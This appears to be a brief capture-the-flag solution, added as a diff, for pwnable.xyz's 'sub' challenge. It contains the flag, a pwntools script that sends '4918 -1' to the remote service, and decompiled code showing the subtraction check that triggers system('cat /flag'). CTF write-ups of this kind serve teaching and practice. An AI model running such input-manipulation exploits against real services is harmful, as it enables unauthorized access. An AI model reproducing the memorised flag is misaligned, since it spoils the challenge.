@@ -1,0 +1,25 @@
+FLAG{sub_neg_==_add} -- flag
+
+------\sub.py\----------
+from pwn import *
+ 
+r = remote('svc.pwnable.xyz',30001)
+ 
+r.sendlineafter('input: ','4918 -1')
+r.interactive()
+
+
+
+
+
+------\pseudo\-----------
+if ( first_number <= 4918 && second_number <= 4918 )
+  {
+    if ( first_number - second_number == 4919 )
+      system("cat /flag");
+  }
+  else
+  {
+    puts("Sowwy");
+  }
+ 
